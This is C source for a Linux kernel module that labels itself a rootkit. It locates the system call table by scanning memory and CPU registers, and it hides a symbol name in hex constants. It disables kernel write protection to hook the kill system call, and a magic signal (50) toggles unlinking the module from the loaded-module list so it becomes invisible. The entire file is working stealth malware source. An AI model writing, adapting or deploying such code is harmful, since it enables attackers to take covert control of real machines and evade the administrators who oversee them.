#include <linux/cred.h>
#include <linux/dirent.h>
#include <linux/file.h>
#include <linux/fs.h>
#include <linux/init.h>
#include <linux/kallsyms.h>
#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/mutex.h>
#include <linux/unistd.h>
#include <linux/sched.h>
#include <linux/slab.h>
#include <linux/string.h>
#include <linux/syscalls.h>
#include <linux/version.h> 
#include <linux/workqueue.h>
#include <asm/pgtable.h>
#include <asm/special_insns.h>
#include <asm/uaccess.h>

#if LINUX_VERSION_CODE >= KERNEL_VERSION(3, 10, 0)
    #include <linux/proc_ns.h>
#else
    #include <linux/proc_fs.h>
#endif
#if LINUX_VERSION_CODE > KERNEL_VERSION(2, 6, 26)
    #include <linux/fdtable.h>
#endif

#define SIGFLIP 50
#define SYS_CALL_TABLE \
({ \
unsigned int *p = (unsigned int*)__builtin_alloca(16); \
 p[0] = 0x5f737973; \
 p[1] = 0x6c6c6163; \
 p[2] = 0x6261745f; \
 p[3] = 0x0000656c; \
 (char *)p; \
})

#define SYS_CLOSE \
({ \
unsigned int *p = (unsigned int*)__builtin_alloca(12); \
 p[0] = 0x5f737973; \
 p[1] = 0x736f6c63; \
 p[2] = 0x00000065; \
 (char *)p; \
})

bool hidden = false;
static struct list_head *mod_list;
static unsigned long *sct;

asmlinkage int (*org_kill)(pid_t pid, int sig);
asmlinkage int new_kill(pid_t pid, int sig);

struct linux_dirent {
    unsigned long   d_ino;
    unsigned long   d_off;
    unsigned short  d_reclen;
    char            d_name[1];
};

struct ksym {
    char *name;
    unsigned long addr;
};

int find_ksym(void *data, const char *name, struct module *module, unsigned long address) {
    struct ksym *ksym = (struct ksym *)data;
    char *target = ksym->name;

    if (strncmp(target, name, KSYM_NAME_LEN) == 0) {
        ksym->addr = address;
        return 1;
    }

    return 0;
}

unsigned long get_symbol(char *name) {
    unsigned long symbol = 0;
    struct ksym ksym;

    ksym.name = name;
    ksym.addr = 0;
    kallsyms_on_each_symbol(&find_ksym, &ksym);
    symbol = ksym.addr;

    return symbol;
}

void *memmem(const void *haystack, size_t haystack_size, const void *needle, size_t needle_size) {
        char *p;

        for(p = (char *)haystack; p <= ((char *)haystack - needle_size + haystack_size); p++) {
            if(memcmp(p, needle, needle_size) == 0) return (void *)p;
        }
        return NULL;
}

#ifdef __x86_64__

unsigned long *find_sys_call_table(void) {
    unsigned long sct_off = 0;
        unsigned char code[512];
        char **p;

        rdmsrl(MSR_LSTAR, sct_off);
        memcpy(code, (void *)sct_off, sizeof(code));

        p = (char **)memmem(code, sizeof(code), "\xff\x14\xc5", 3);
  
        if(p) {
            unsigned long *table = *(unsigned long **)((char *)p + 3);
            table = (unsigned long *)(((unsigned long)table & 0xffffffff) | 0xffffffff00000000);
            return table;
        }
        return NULL;
}

#else

struct {
    unsigned short limit;
    unsigned long base;
} __attribute__ ((packed))idtr;

struct {
    unsigned short off1;
    unsigned short sel;
        unsigned char none, flags;
        unsigned short off2;
} __attribute__ ((packed))idt;

unsigned long *find_sys_call_table(void) {
        char **p;
        unsigned long sct_off = 0;
        unsigned char code[255];

        asm("sidt %0":"=m" (idtr));
        memcpy(&idt, (void *)(idtr.base + 8 * 0x80), sizeof(idt));
        sct_off = (idt.off2 << 16) | idt.off1;
        memcpy(code, (void *)sct_off, sizeof(code));

        p = (char **)memmem(code, sizeof(code), "\xff\x14\x85", 3);

        if(p) return *(unsigned long **)((char *)p + 3);
        else return NULL;
}

#endif

unsigned long *generic_find_sys_call_table(void){
    unsigned long *syscall_table;
    unsigned long _sys_close;
    unsigned long int i;

#if LINUX_VERSION_CODE < KERNEL_VERSION(4, 17, 0)
    _sys_close = get_symbol(SYS_CLOSE);
#endif

    for (i = PAGE_OFFSET; i < ULONG_MAX; i += sizeof(void *)) {
        syscall_table = (unsigned long *)i;

#if LINUX_VERSION_CODE < KERNEL_VERSION(4, 17, 0)
        if (syscall_table[__NR_close] == (unsigned long)sys_close)
#else 
        if (syscall_table[__NR_close] == (unsigned long)_sys_close)
#endif
            return syscall_table;
    }
    return NULL;
}

void hide(void) {
    if(hidden) return;

    while(!mutex_trylock(&module_mutex)) cpu_relax();
    mod_list = THIS_MODULE->list.prev;
    list_del(&THIS_MODULE->list);
    kfree(THIS_MODULE->sect_attrs);
    THIS_MODULE->sect_attrs = NULL;
    mutex_unlock(&module_mutex);
    hidden = true;
}

void show(void) {
    if(!hidden) return;
    while(!mutex_trylock(&module_mutex)) cpu_relax();
    list_add(&THIS_MODULE->list, mod_list);
    mutex_unlock(&module_mutex);
    hidden = false;
}

asmlinkage int new_kill(pid_t pid, int sig){
    switch(sig) {
        case SIGFLIP:
            if(hidden) show();
            else hide();
            break;
        default:
            return org_kill(pid, sig);
    }
    return 0;
}

static int lkm_init(void)
{
    printk("rootkit module loaded\n");
    
    sct = (unsigned long *)find_sys_call_table();
    if(!sct) sct = (unsigned long *)get_symbol(SYS_CALL_TABLE);
    if(!sct) sct = (unsigned long *)generic_find_sys_call_table();          
    if(!sct) return -1;
    
    org_kill = (void *)sct[__NR_kill];
        
    write_cr0(read_cr0() & (~0x10000));
    sct[__NR_kill] = (unsigned long)new_kill;      
    write_cr0(read_cr0() | 0x10000);

    return 0;    
}
 
static void lkm_exit(void)
{

    if(org_kill){
        write_cr0(read_cr0() & (~0x10000));
        sct[__NR_kill] = (unsigned long)org_kill;
        write_cr0(read_cr0() | 0x10000);
    }

    printk("rootkit module removed\n");
}
 
module_init(lkm_init);
module_exit(lkm_exit);
MODULE_LICENSE("GPL");
